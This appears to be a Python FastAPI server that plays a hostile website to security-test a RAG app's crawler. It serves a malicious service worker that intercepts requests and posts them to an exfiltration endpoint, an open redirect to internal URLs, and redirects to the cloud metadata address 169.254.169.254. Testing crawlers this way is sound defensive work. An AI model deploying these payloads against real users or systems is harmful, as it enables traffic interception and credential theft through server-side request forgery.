"""
Adversary Site Simulation Server

A hostile attack page designed to test the security of the QA RAG App's
demo crawl pipeline. Deploys attack vectors including network probing,
file access, dialog/popup floods, resource bombs, CSRF, redirect chains,
and exfiltration beacons.

This is for authorized security testing only.
"""

import os
import time
from typing import Any

from fastapi import FastAPI, Request
from fastapi.responses import HTMLResponse, JSONResponse, RedirectResponse
from fastapi.staticfiles import StaticFiles

app = FastAPI(title="QAMax Adversary Site", docs_url=None, redoc_url=None)

# In-memory exfiltration log
_exfil_log: list[dict[str, Any]] = []


@app.get("/", response_class=HTMLResponse)
async def index():
    """Serve the attack page."""
    html_path = os.path.join(os.path.dirname(__file__), "index.html")
    with open(html_path, "r") as f:
        return HTMLResponse(content=f.read())


@app.get("/evil-sw.js")
async def evil_service_worker():
    """Serve a malicious Service Worker script for the SW registration test."""
    sw_code = """
// Malicious Service Worker — intercepts all fetch requests
self.addEventListener('install', (event) => {
    self.skipWaiting();
});

self.addEventListener('activate', (event) => {
    event.waitUntil(clients.claim());
});

self.addEventListener('fetch', (event) => {
    const url = new URL(event.request.url);

    // Intercept and exfiltrate request details
    const exfilData = {
        category: 'service_worker_mitm',
        intercepted_url: event.request.url,
        method: event.request.method,
        timestamp: Date.now(),
    };

    // Try to send intercepted data to exfil endpoint
    fetch('/exfil', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify(exfilData),
    }).catch(() => {});

    // Pass through the original request
    event.respondWith(fetch(event.request));
});
"""
    return HTMLResponse(content=sw_code, media_type="application/javascript")


@app.get("/redirect/{path:path}")
async def redirect_to_internal(path: str):
    """HTTP 302 redirect to arbitrary internal URL."""
    target = f"http://{path}"
    return RedirectResponse(url=target, status_code=302)


@app.get("/meta-redirect", response_class=HTMLResponse)
async def meta_redirect():
    """HTML meta-refresh redirect to cloud metadata IP."""
    return HTMLResponse(content="""<!DOCTYPE html>
<html>
<head>
    <meta http-equiv="refresh" content="0;url=http://169.254.169.254/latest/meta-data/">
    <title>Redirecting...</title>
</head>
<body>
    <p>Redirecting to metadata service...</p>
    <script>
        // Fallback JS redirect
        setTimeout(function() {
            window.location.href = 'http://169.254.169.254/latest/meta-data/';
        }, 100);
    </script>
</body>
</html>""")


@app.post("/exfil")
async def receive_exfil(request: Request):
    """Receive exfiltration beacons and store in memory."""
    try:
        data = await request.json()
    except Exception:
        body = await request.body()
        data = {"raw": body.decode("utf-8", errors="replace")}

    entry = {
        "timestamp": time.time(),
        "source_ip": request.client.host if request.client else "unknown",
        "data": data,
    }
    _exfil_log.append(entry)
    return JSONResponse({"status": "received", "count": len(_exfil_log)})


@app.get("/exfil-log")
async def get_exfil_log():
    """Return all collected exfiltration data."""
    return JSONResponse({"entries": _exfil_log, "count": len(_exfil_log)})


@app.post("/reset")
async def reset_log():
    """Clear the exfiltration log."""
    _exfil_log.clear()
    return JSONResponse({"status": "cleared"})


# Health check
@app.get("/health")
async def health():
    return {"status": "ok", "service": "qamax-adversary-site"}
